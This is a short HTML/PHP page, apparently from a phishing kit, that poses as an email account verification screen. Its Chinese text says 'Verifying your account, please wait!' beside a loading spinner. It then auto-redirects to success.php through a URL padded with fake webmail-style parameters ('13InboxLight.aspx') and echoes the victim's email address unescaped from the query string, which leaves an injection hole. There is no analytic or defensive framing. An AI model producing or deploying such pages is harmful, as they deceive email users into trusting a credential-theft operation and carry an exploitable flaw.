<html>
<head>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>

<meta http-equiv="REFRESH" content="10; success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">

<title>&#30005;&#23376;&#37038;&#20214;&#35774;&#32622;  </title></head>
</head>

<br><br>

<table><tr>

<td width="30"></td>

<td>

	<img src="files/loader.gif" width="50" height="50">
</td>



<td width="5"></td>



<td>
	
	<font face="verdana" size="3">
	<b>&#27491;&#22312;&#39564;&#35777;&#24744;&#30340;&#24080;&#25143;... </b>
	<br>
	<font size="2"> &#27491;&#22312;&#39564;&#35777;&#24744;&#30340;&#24080;&#25143;&#65292;&#35831;&#31245;&#20505;  !</font>
	</font>

</td>

</tr></table>

<body>

</body>
</html>